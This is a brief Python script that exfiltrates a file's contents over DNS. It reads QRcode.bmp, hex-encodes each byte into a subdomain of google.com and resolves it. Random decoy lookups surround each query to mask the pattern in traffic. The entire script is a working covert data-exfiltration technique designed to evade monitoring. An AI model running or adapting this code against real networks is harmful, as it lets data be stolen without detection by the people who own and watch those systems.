import socket
import random

MAX_NOISE_COUNT = 3

f = open('QRcode.bmp', 'r')
payload = f.read();
f.close();

message = '\S' + payload + '\E'
message = message.encode()
print(message)

for b in range(len(message)):
    send = 'a' + 'EF' + format(message[b], 'x') + '.google.com'
    print(send)

    # inject 1 to X amounts of noise into the pipe
    for i in range(random.randint(1, MAX_NOISE_COUNT)):
        socket.gethostbyname("google.com")
    # inject our payload
    socket.gethostbyname(send)
    # inject 0 to X amounts of noise into the pipe
    for i in range(random.randint(0, MAX_NOISE_COUNT)):
        socket.gethostbyname("google.com")
